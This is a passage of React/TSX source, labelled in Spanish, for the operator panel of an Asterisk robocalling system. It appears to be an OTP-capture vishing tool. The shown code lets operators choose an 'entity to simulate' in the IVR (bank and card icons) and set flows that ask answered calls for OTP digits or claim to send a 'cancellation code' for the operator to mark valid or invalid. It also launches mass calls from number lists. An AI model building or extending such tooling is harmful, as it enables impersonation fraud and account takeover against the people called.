                    onClick={() => setCallFlowMode('otp')}
                    title={!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp') ? 'Solo el Administrador puede asignar este plan de marcación' : undefined}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'otp'
                        ? 'bg-emerald-500/15 border-emerald-500 text-white ring-1 ring-emerald-500/50 shadow cursor-pointer'
                        : !isSuperAdmin && !adminAllowedCallFlowModes.includes('otp')
                        ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700 cursor-pointer'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <KeyRound className="w-3.5 h-3.5 text-emerald-400" />
                        <span>1. Captura OTP</span>
                      </span>
                      {callFlowMode === 'otp' ? (
                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                      ) : (!isSuperAdmin && !adminAllowedCallFlowModes.includes('otp')) ? (
                        <Lock className="w-3 h-3 text-slate-500" />
                      ) : null}
                    </div>
                    <p className="text-[10px] text-slate-400 mt-1">Pide dígitos OTP al contestar</p>
                  </button>

                  <button
                    type="button"
                    disabled={!isSuperAdmin && !adminAllowedCallFlowModes.includes('press1')}
                    onClick={() => setCallFlowMode('press1')}
                    title={!isSuperAdmin && !adminAllowedCallFlowModes.includes('press1') ? 'Solo el Administrador puede asignar este plan de marcación' : undefined}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'press1'
                        ? 'bg-sky-500/15 border-sky-500 text-white ring-1 ring-sky-500/50 shadow cursor-pointer'
                        : !isSuperAdmin && !adminAllowedCallFlowModes.includes('press1')
                        ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700 cursor-pointer'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <PhoneForwarded className="w-3.5 h-3.5 text-sky-400" />
                        <span>2. Press-1 (Asesor)</span>
                      </span>
                      {callFlowMode === 'press1' ? (
                        <CheckCircle2 className="w-3.5 h-3.5 text-sky-400" />
                      ) : (!isSuperAdmin && !adminAllowedCallFlowModes.includes('press1')) ? (
                        <Lock className="w-3 h-3 text-slate-500" />
                      ) : null}
                    </div>
                    <p className="text-[10px] text-slate-400 mt-1">Al marcar 1 transfiere a Softphone</p>
                  </button>

                  <button
                    type="button"
                    disabled={!isSuperAdmin && !adminAllowedCallFlowModes.includes('hybrid')}
                    onClick={() => setCallFlowMode('hybrid')}
                    title={!isSuperAdmin && !adminAllowedCallFlowModes.includes('hybrid') ? 'Solo el Administrador puede asignar este plan de marcación' : undefined}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'hybrid'
                        ? 'bg-purple-500/15 border-purple-500 text-white ring-1 ring-purple-500/50 shadow cursor-pointer'
                        : !isSuperAdmin && !adminAllowedCallFlowModes.includes('hybrid')
                        ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700 cursor-pointer'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <Radio className="w-3.5 h-3.5 text-purple-400" />
                        <span>3. Híbrido</span>
                      </span>
                      {callFlowMode === 'hybrid' ? (
                        <CheckCircle2 className="w-3.5 h-3.5 text-purple-400" />
                      ) : (!isSuperAdmin && !adminAllowedCallFlowModes.includes('hybrid')) ? (
                        <Lock className="w-3 h-3 text-slate-500" />
                      ) : null}
                    </div>
                    <p className="text-[10px] text-slate-400 mt-1">OTP automático o Press-1</p>
                  </button>

                  <button
                    id="btn-single-mode-cancel-code"
                    type="button"
                    disabled={!isSuperAdmin && !adminAllowedCallFlowModes.includes('cancel_code')}
                    onClick={() => setCallFlowMode('cancel_code')}
                    title={!isSuperAdmin && !adminAllowedCallFlowModes.includes('cancel_code') ? 'Solo el Administrador puede asignar este plan de marcación' : undefined}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'cancel_code'
                        ? 'bg-amber-500/20 border-amber-400 text-white ring-2 ring-amber-400/50 shadow-lg shadow-amber-500/10 cursor-pointer'
                        : !isSuperAdmin && !adminAllowedCallFlowModes.includes('cancel_code')
                        ? 'bg-slate-950/40 border-slate-800/60 text-slate-600 opacity-45 cursor-not-allowed'
                        : 'bg-slate-950/80 border-slate-800 text-slate-400 hover:text-white hover:border-amber-500/40 cursor-pointer'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <ShieldCheck className="w-3.5 h-3.5 text-amber-400" />
                        <span>4. Código Cancelación</span>
                      </span>
                      {callFlowMode === 'cancel_code' ? (
                        <CheckCircle2 className="w-3.5 h-3.5 text-amber-400" />
                      ) : (!isSuperAdmin && !adminAllowedCallFlowModes.includes('cancel_code')) ? (
                        <Lock className="w-3 h-3 text-slate-500" />
                      ) : null}
                    </div>
                    <p className="text-[10px] text-amber-300/90 mt-1">Marca 1 → Envía código + Válido/Inválido</p>
                  </button>
                </div>

                {callFlowMode === 'cancel_code' && (
                  <div className="p-3 rounded-xl bg-amber-950/30 border border-amber-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs animate-fadeIn">
                    <div className="text-amber-200/95 space-y-0.5">
                      <div className="font-bold text-amber-300 flex items-center gap-1.5">
                        <Volume2 className="w-3.5 h-3.5 text-amber-400" />
                        <span>Flujo Código de Cancelación Activo:</span>
                      </div>
                      <p className="text-[11px] text-slate-300">
                        Al marcar <strong>1</strong>, el IVR dice: <em>"Un momento por favor, le estamos enviando un código de cancelación"</em> (<code className="text-amber-300 font-mono">{getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'}</code>) y tú decides en pantalla si es <strong>Válido</strong> o <strong>Inválido</strong>.
                      </p>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion', 'single_cancel_wait')}
                      className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-200 border border-amber-500/40 text-xs font-bold flex items-center gap-1.5 shrink-0 cursor-pointer"
                    >
                      {playingAudioKey === 'single_cancel_wait' ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                      <span>{playingAudioKey === 'single_cancel_wait' ? 'Pausar' : 'Escuchar Audio'}</span>
                    </button>
                  </div>
                )}
              </div>


              {/* Service Template Selection with Dynamic Entity Management & Campaign Selection for Agents */}
              <div className="space-y-3">
                {/* Sub-header Guión / Entidad a Simular */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pt-1">
                  <div>
                    <div className="flex items-center gap-2">
                      <label className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
                        <Building2 className="w-4 h-4 text-emerald-400" />
                        <span>Guión / Entidad a Simular en el IVR</span>
                      </label>
                      {campaignEntities.find((e) => e.id === selectedService)?.isLocked ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40">
                          <Lock className="w-3 h-3 text-amber-400" />
                          <span>Bloqueo manual (isLocked: true)</span>
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-medium bg-slate-800 text-slate-400 border border-slate-700">
                          <Unlock className="w-3 h-3" />
                          <span>Desbloqueado</span>
                        </span>
                      )}
                      {canEditEntityCatalog ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40" title="Tienes privilegios de Super Administrador para editar, crear y asignar guiones">
                          <ShieldCheck className="w-3 h-3 text-emerald-400" />
                          <span>Super Administrador</span>
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-sky-500/20 text-sky-300 border border-sky-500/40" title={`Guiones asignados a ${userTenant?.name || `Ext. ${agentExtension}`}`}>
                          <User className="w-3 h-3 text-sky-400" />
                          <span>{userTenant ? `${userTenant.name} (${visibleCampaignEntities.length} guiones)` : `Operador Ext. ${agentExtension}`}</span>
                        </span>
                      )}
                    </div>
                    <p className="text-[11px] text-slate-400">
                      {userTenant && !isSuperAdmin
                        ? `Elige qué guión de los asignados a "${userTenant.name}" van a trabajar hoy y presiona "Guardar Guión" sin cruzarse con otros Call Centers.`
                        : `Selecciona la entidad que deseas simular y presiona "Guardar Guión" para activarlo en Asterisk de forma aislada para tu extensión ${agentExtension}.`}
                    </p>
                  </div>
                  <div className="flex items-center gap-1.5 self-start sm:self-auto flex-wrap">
                    {/* Botón Guardar Guión disponible para TODOS los operadores y administradores */}
                    <button
                      type="button"
                      onClick={handleSaveAndLockCurrentEntity}
                      disabled={isEntitySaving || visibleCampaignEntities.length === 0}
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all shadow-md bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white shadow-emerald-600/20 cursor-pointer disabled:opacity-40"
                      title={`Guardar y sincronizar este guión para trabajar hoy (${userTenant ? userTenant.name : `Ext. ${agentExtension}`})`}
                    >
                      {isEntitySaving ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Save className="w-3.5 h-3.5" />}
                      <span>{isEntitySaving ? 'Guardando...' : userTenant && !isSuperAdmin ? 'Guardar Guión de Hoy' : `Guardar Guión (Ext. ${agentExtension})`}</span>
                    </button>

                    {canEditEntityCatalog ? (
                      <>
                        {campaignEntities.find((e) => e.id === selectedService)?.isLocked && (
                          <button
                            type="button"
                            onClick={handleUnlockCurrentEntity}
                            className="inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-amber-300 hover:text-white border border-amber-500/30 transition-all cursor-pointer"
                            title="Desbloquear guión para permitir sincronización automática"
                          >
                            <Unlock className="w-3.5 h-3.5" />
                            <span>Desbloquear</span>
                          </button>
                        )}

                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg text-[11px] font-bold bg-sky-500/15 text-sky-300 border border-sky-500/30" title="Solo los guiones marcados como Activos aparecen en Call Centers y Usuarios">
                          <span>Activos: {campaignEntities.filter((e) => e.isActive !== false).length}/{campaignEntities.length}</span>
                        </span>
                        <button
                          type="button"
                          onClick={handleAddNewEntity}
                          className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 transition-all shadow-sm"
                          title="Crear un nuevo guión con audios personalizados"
                        >
                          <Plus className="w-3.5 h-3.5" />
                          <span>+ Nuevo Guión</span>
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            const current = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
                            setEditingEntity({ ...current });
                            setIsEntityModalOpen(true);
                          }}
                          className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
                          title="Editar el guión actualmente seleccionado"
                        >
                          <Pencil className="w-3 h-3 text-amber-400" />
                          <span>Editar Seleccionado</span>
                        </button>
                        {campaignEntities.length > 1 && (
                          confirmDeleteId === selectedService ? (
                            <div className="inline-flex items-center gap-1 bg-rose-950/90 px-2 py-1 rounded-lg border border-rose-500/60">
                              <span className="text-[10px] font-bold text-rose-300">¿Eliminar guión seleccionado?</span>
                              <button
                                type="button"
                                onClick={() => handleDeleteEntity(selectedService)}
                                className="px-2 py-0.5 rounded bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold shadow"
                              >
                                Sí
                              </button>
                              <button
                                type="button"
                                onClick={() => setConfirmDeleteId(null)}
                                className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px]"
                              >
                                No
                              </button>
                            </div>
                          ) : (
                            <button
                              type="button"
                              onClick={() => setConfirmDeleteId(selectedService)}
                              className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition-all"
                              title="Eliminar el guión actualmente seleccionado"
                            >
                              <Trash2 className="w-3 h-3" />
                              <span>Eliminar Seleccionado</span>
                            </button>
                          )
                        )}
                        <button
                          type="button"
                          onClick={handleResetEntities}
                          className="inline-flex items-center gap-1 px-2 py-1.5 rounded-lg text-[11px] text-slate-400 hover:text-slate-200 bg-slate-900 border border-slate-800 hover:border-slate-700 transition-all"
                          title="Restablecer guiones de fábrica"
                        >
                          <RotateCcw className="w-3 h-3" />
                          <span>Restablecer</span>
                        </button>
                      </>
                    ) : (
                      <div className="inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs bg-slate-900/90 border border-sky-500/30 text-sky-300 shadow-sm" title={`Aislamiento activo sin cruce con otros Call Centers`}>
                        <ShieldCheck className="w-3.5 h-3.5 text-sky-400" />
                        <span>{userTenant ? `Aislamiento ${userTenant.code}` : `Aislamiento Activo (Ext. ${agentExtension})`}</span>
                      </div>
                    )}
                  </div>
                </div>

                {visibleCampaignEntities.length === 0 ? (
                  <div className="p-5 rounded-xl bg-amber-950/30 border border-amber-500/40 text-amber-200 text-xs flex items-center gap-3">
                    <AlertCircle className="w-5 h-5 text-amber-400 shrink-0" />
                    <div>
                      <div className="font-bold text-amber-300">Sin Guiones Asignados</div>
                      <p className="text-amber-200/80 mt-0.5">
                        El Super Administrador aún no ha habilitado guiones activos para <strong>{userTenant?.name || activeUser?.name || 'tu cuenta'}</strong>. Pídele que te asigne al menos un guión en <strong>{userTenant ? 'Multi-Call Center' : 'Usuarios'}</strong>.
                      </p>
                    </div>
                  </div>
                ) : (
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
                  {visibleCampaignEntities.map((ent) => {
                    const isSelected = selectedService === ent.id;
                    const isEntityActive = ent.isActive !== false;
                    const renderIcon = () => {
                      switch (ent.icon) {
                        case 'building':
                          return <Building2 className="w-4 h-4 text-emerald-400" />;
                        case 'card':
                          return <CreditCard className="w-4 h-4 text-sky-400" />;
                        case 'message':
                          return <MessageSquare className="w-4 h-4 text-emerald-300" />;
                        case 'lock':
                          return <Lock className="w-4 h-4 text-amber-400" />;
                        case 'shopping':
                          return <ShoppingBag className="w-4 h-4 text-orange-400" />;
                        default:
                          return <Sliders className="w-4 h-4 text-purple-400" />;
                      }
                    };

                    const cleanIntro = ent.introAudioPath?.replace(/^custom\//, '') || 'alerta';
                    const cleanAgent = ent.agentAudioPath?.replace(/^custom\//, '') || 'conectar_asesor';
                    const cleanPrompt = ent.promptAudioPath?.replace(/^custom\//, '') || 'solicitar_otp';

                    return (
                      <div
                        key={ent.id}
                        onClick={() => handleSelectEntity(ent)}
                        className={`p-3 rounded-xl border text-left transition-all cursor-pointer relative group flex flex-col justify-between gap-2.5 ${
                          isSelected
                            ? 'bg-emerald-950/30 border-emerald-500 text-white shadow-lg shadow-emerald-500/10 ring-1 ring-emerald-500/50'
                            : isEntityActive
                            ? 'bg-slate-900/90 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                            : 'bg-slate-950/70 border-slate-800/70 text-slate-500 opacity-65 hover:opacity-95'
                        }`}
                      >
                        <div className="flex items-start justify-between gap-2">
                          <div className="flex items-center gap-2 min-w-0 flex-1">
                            <div className={`p-1.5 rounded-lg shrink-0 ${isSelected ? 'bg-emerald-500/20' : 'bg-slate-800'}`}>
                              {renderIcon()}
                            </div>
                            {inlineRenamingId === ent.id && canEditEntityCatalog ? (
                              <div className="flex-1 space-y-1 min-w-0" onClick={(e) => e.stopPropagation()}>
                                <input
                                  type="text"
                                  value={inlineNameVal}
                                  onChange={(e) => setInlineNameVal(e.target.value)}
                                  onKeyDown={(e) => {
                                    if (e.key === 'Enter') handleSaveInlineRename(ent.id, e);
                                    if (e.key === 'Escape') handleCancelInlineRename(e);
                                  }}
                                  placeholder="Nombre de la entidad..."
                                  className="w-full px-2 py-1 bg-slate-950 border border-emerald-500 rounded text-xs font-bold text-white focus:outline-none"
                                  autoFocus
                                />
                                <input
                                  type="text"
                                  value={inlineSubtitleVal}
                                  onChange={(e) => setInlineSubtitleVal(e.target.value)}
                                  onKeyDown={(e) => {
                                    if (e.key === 'Enter') handleSaveInlineRename(ent.id, e);
                                    if (e.key === 'Escape') handleCancelInlineRename(e);
                                  }}
                                  placeholder="Subtítulo..."
                                  className="w-full px-2 py-0.5 bg-slate-950 border border-slate-700 rounded text-[10px] text-slate-300 focus:outline-none focus:border-emerald-500"
                                />
                                <div className="flex items-center gap-1 pt-0.5">
                                  <button
                                    type="button"
                                    onClick={(e) => handleSaveInlineRename(ent.id, e)}
                                    className="px-2 py-0.5 rounded bg-emerald-500 hover:bg-emerald-400 text-black text-[10px] font-bold"
                                  >
                                    Guardar
                                  </button>
                                  <button
                                    type="button"
                                    onClick={handleCancelInlineRename}
                                    className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px]"
                                  >
                                    Cancelar
                                  </button>
                                </div>
                              </div>
                            ) : (
                              <div
                                className={`truncate flex-1 ${canEditEntityCatalog ? 'cursor-pointer group/title' : ''}`}
                                onClick={(e) => {
                                  if (canEditEntityCatalog) handleStartInlineRename(ent, e);
                                }}
                                title={canEditEntityCatalog ? "Haz clic para renombrar directamente" : ent.name}
                              >
                                <div className={`text-xs font-bold text-white leading-tight truncate flex items-center gap-1.5 ${canEditEntityCatalog ? 'hover:text-emerald-400 transition-colors' : ''}`}>
                                  <span>{ent.name}</span>
                                  {ent.isLocked && (
                                    <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[9px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40">
                                      <Lock className="w-2.5 h-2.5 text-amber-400" />
                                      <span>Bloqueado</span>
                                    </span>
                                  )}
                                  {canEditEntityCatalog && (
                                    <Pencil className="w-2.5 h-2.5 opacity-0 group-hover/title:opacity-100 text-slate-400 transition-opacity" />
                                  )}
                                </div>
                                <div className="text-[10px] text-slate-400 truncate">{ent.subtitle}</div>
                              </div>
                            )}
                          </div>
                          {canEditEntityCatalog && inlineRenamingId !== ent.id && (
                            confirmDeleteId === ent.id ? (
                              <div
                                className="flex items-center gap-1 bg-rose-950/90 p-1 rounded-lg border border-rose-500/60 shrink-0"
                                onClick={(e) => e.stopPropagation()}
                              >
                                <span className="text-[10px] text-rose-300 font-bold px-0.5">¿Borrar?</span>
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    handleDeleteEntity(ent.id);
                                  }}
                                  className="px-2 py-0.5 rounded bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold shadow transition-colors"
                                  title="Confirmar eliminación"
                                >
                                  Sí
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setConfirmDeleteId(null);
                                  }}
                                  className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] transition-colors"
                                  title="Cancelar"
                                >
                                  No
                                </button>
                              </div>
                            ) : (
                              <div className="flex items-center gap-1 shrink-0">
                                <button
                                  type="button"
                                  onClick={(e) => handleToggleEntityActive(ent.id, e)}
                                  title={isEntityActive ? 'Guión Activo (visible en Call Centers y Usuarios). Clic para desactivar' : 'Guión Inactivo (oculto en Call Centers y Usuarios). Clic para activar'}
                                  className={`px-2 py-1 rounded-lg text-[10px] font-bold border transition-all cursor-pointer ${
                                    isEntityActive
                                      ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/40 hover:bg-emerald-500/25'
                                      : 'bg-slate-800 text-slate-400 border-slate-700 hover:text-white'
                                  }`}
                                >
                                  {isEntityActive ? '● Activo' : '○ Inactivo'}
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => handleStartInlineRename(ent, e)}
                                  title="Cambiar nombre de este guión"
                                  className="p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-400 hover:text-emerald-300 border border-slate-700/80 transition-all"
                                >
                                  <Edit3 className="w-3 h-3" />
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setEditingEntity({ ...ent });
                                    setIsEntityModalOpen(true);
                                  }}
                                  title="Configurar todos los audios y detalles de este guión"
                                  className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-all"
                                >
                                  <Sliders className="w-3 h-3 text-amber-400" />
                                </button>
                                <button
                                  type="button"
                                  disabled={campaignEntities.length <= 1}
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setConfirmDeleteId(ent.id);
                                  }}
                                  title={campaignEntities.length <= 1 ? "Debe haber al menos un guión disponible" : "Eliminar este guión"}
                                  className="p-1.5 rounded-lg bg-slate-800/80 hover:bg-rose-950/60 text-slate-400 hover:text-rose-400 border border-slate-700/80 hover:border-rose-500/40 transition-all disabled:opacity-20 disabled:cursor-not-allowed"
                                >
                                  <Trash2 className="w-3 h-3" />
                                </button>
                              </div>
                            )
                          )}
                        </div>

                        {/* Badges de audios asignados a esta entidad */}
                        <div className="space-y-1 text-[10px] font-mono bg-slate-950/80 p-2 rounded-lg border border-slate-800/80">
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <Volume2 className="w-2.5 h-2.5 text-emerald-400" /> Saludo:
                            </span>
                            <span className="text-emerald-300 truncate font-semibold" title={ent.introAudioPath}>
                              {cleanIntro}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <PhoneForwarded className="w-2.5 h-2.5 text-sky-400" /> Asesor (1):
                            </span>
                            <span className="text-sky-300 truncate font-semibold" title={ent.agentAudioPath}>
                              {cleanAgent}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <KeyRound className="w-2.5 h-2.5 text-purple-400" /> OTP:
                            </span>
                            <span className="text-purple-300 truncate font-semibold" title={ent.promptAudioPath}>
                              {cleanPrompt}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
                              <Music className="w-2.5 h-2.5 text-amber-400" /> Hold MOH:
                            </span>
                            <span className="text-amber-300 truncate font-semibold" title={ent.holdMusicAudioPath || 'default'}>
                              {(!ent.holdMusicAudioPath || ent.holdMusicAudioPath === 'default') ? 'Asterisk Default' : ent.holdMusicAudioPath.replace(/^custom\//, '')}
                            </span>
                          </div>
                        </div>

                        {/* Campaña Asociada y Estado */}
                        {(() => {
                          const linkedCamp = dialingCampaigns.find((c) => c.entityId === ent.id);
                          const isCampSelected = selectedCampaignId === linkedCamp?.id;
                          return (
                            <div className="space-y-1.5 pt-1 border-t border-slate-800/80">
                              <div className="flex items-center justify-between text-[10px] text-slate-400">
                                <span className="flex items-center gap-1 truncate text-slate-300">
                                  <Target className="w-2.5 h-2.5 text-emerald-400 shrink-0" />
                                  <strong className="truncate">{linkedCamp ? linkedCamp.name.replace('Campaña ', '') : 'Campaña General'}</strong>
                                </span>
                                {isCampSelected && isSelected ? (
                                  <span className="text-[10px] font-black text-emerald-300 bg-emerald-500/20 border border-emerald-500/40 px-1.5 py-0.5 rounded flex items-center gap-1 shrink-0">
                                    <Check className="w-2.5 h-2.5" /> Activa
                                  </span>
                                ) : (
                                  <button
                                    type="button"
                                    onClick={(e) => {
                                      e.stopPropagation();
                                      if (linkedCamp) {
                                        handleSelectCampaign(linkedCamp.id);
                                      } else {
                                        handleSelectEntity(ent);
                                      }
                                    }}
                                    className="px-2 py-0.5 rounded text-[10px] font-bold text-sky-300 bg-sky-950/80 hover:bg-sky-900 border border-sky-500/40 transition-all cursor-pointer"
                                    title="Marcar con esta Campaña y Guión"
                                  >
                                    Seleccionar
                                  </button>
                                )}
                              </div>
                              <div className="flex items-center justify-between text-[10px] text-slate-500">
                                <span className="truncate">ID Saliente: Asignado por Carrier</span>
                                {isSelected ? (
                                  <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 shrink-0">
                                    <Check className="w-3 h-3" /> Guión Activo
                                  </span>
                                ) : (
                                  <span className="text-[10px] text-slate-500 group-hover:text-slate-300 transition-colors">
                                    Clic para activar
                                  </span>
                                )}
                              </div>
                            </div>
                          );
                        })()}
                      </div>
                    );
                  })}
                </div>
                )}
              </div>

              {/* Action Buttons: Launch & Hangup */}
              <div className="pt-2 grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                <button
                  id="btn-launch-production-call"
                  onClick={handleLaunchProductionCall}
                  disabled={isLaunching || isHangingUp || !targetNumber.trim()}
                  className="sm:col-span-2 py-4 px-4 rounded-xl font-black text-sm sm:text-base bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 shadow-xl shadow-emerald-500/25 transition-all flex items-center justify-center gap-3 disabled:opacity-50 cursor-pointer"
                >
                  {isLaunching ? (
                    <RefreshCw className="w-5 h-5 animate-spin shrink-0" />
                  ) : (
                    <Rocket className="w-5 h-5 shrink-0" />
                  )}
                  <span className="truncate">
                    {isLaunching ? 'Lanzando Llamada...' : 'INICIAR LLAMADA'}
                  </span>
                </button>

                <button
                  id="btn-hangup-production-call"
                  type="button"
                  onClick={handleHangupActiveCall}
                  disabled={isHangingUp || isLaunching}
                  className="py-4 px-4 rounded-xl font-black text-sm sm:text-base bg-gradient-to-r from-rose-600 to-red-500 hover:from-rose-500 hover:to-red-400 text-white shadow-xl shadow-rose-600/25 border border-rose-400/30 transition-all flex items-center justify-center gap-2.5 disabled:opacity-50 cursor-pointer"
                  title="Colgar llamada activa o en curso inmediatamente en Asterisk"
                >
                  {isHangingUp ? (
                    <RefreshCw className="w-5 h-5 animate-spin shrink-0" />
                  ) : (
                    <PhoneOff className="w-5 h-5 shrink-0" />
                  )}
                  <span className="truncate">
                    {isHangingUp ? 'Colgando...' : 'COLGAR'}
                  </span>
                </button>
              </div>

              {launchFeedback && (
                <div
                  className={`p-3 rounded-xl text-xs flex items-center gap-2 ${
                    launchFeedback.type === 'success'
                      ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400'
                      : 'bg-rose-500/10 border border-rose-500/30 text-rose-400'
                  }`}
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{launchFeedback.text}</span>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ======================================================== */}
      {/* CENTRO DE LLAMADAS MASIVAS (RING-ALL A TODAS LAS EXTENSIONES) */}
      {/* ======================================================== */}
      {productionMode === 'mass_campaign' && canRunMassCalls && (
        <div className="space-y-6">
          {/* Header Banner */}
          <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-950 via-purple-950/40 to-slate-950 border border-purple-500/40 shadow-2xl relative overflow-hidden">
            <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
              <div>
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/30 text-purple-300 text-xs font-bold mb-2">
                  <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />
                  <span>MODO CAMPAÑA MASIVA CON RING-ALL ACTIVO</span>
                </div>
                <h3 className="text-xl font-black text-white tracking-tight flex items-center gap-3">
                  <Users className="w-6 h-6 text-purple-400" />
                  <span>Centro de Llamadas Masivas</span>
                </h3>
                <p className="text-xs text-slate-300 mt-1 max-w-2xl leading-relaxed">
                  Lanza llamadas automatizadas a una lista de números. Cuando el cliente presione 1,{' '}
                  <strong className="text-purple-300 font-bold">
                    timbrarán las extensiones {userTenant ? `de ${userTenant.name}` : 'disponibles'} simultáneamente
                  </strong>{' '}
                  ({tenantScopedExtensions.join(', ')}). El primer asesor que descuelgue toma la llamada.
                </p>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900/90 border border-purple-500/30 text-xs space-y-1">
                <div className="text-[10px] text-purple-400 font-mono font-bold flex items-center gap-1.5">
                  <Radio className="w-3.5 h-3.5 text-purple-400" />
                  <span>DESTINO AL PRESIONAR 1:</span>
                </div>
                <div className="font-bold text-white font-mono flex items-center gap-1">
                  <span>⚡ Ring-All {userTenant ? `(${userTenant.name})` : '(Todas las Extensiones)'}</span>
                </div>
                <div className="text-[10px] text-slate-400">
                  {tenantScopedExtensions.join(' & ')}
                </div>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Input de Números */}
            <div className="lg:col-span-2 space-y-4 p-6 rounded-2xl bg-slate-950 border border-slate-800">
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
                  <ListOrdered className="w-4 h-4 text-purple-400" />
                  <span>Lista de Números Telefónicos de la Campaña</span>
                </label>
                <span className="text-[11px] font-mono text-purple-400 font-bold">
                  {massNumbersText.split(/[\n,;]+/).filter((x) => x.trim().length >= 7).length} números detectados
                </span>
              </div>

              {/* Input de archivo oculto para carga .txt o .csv */}
              <input
                type="file"
                ref={fileInputRef}
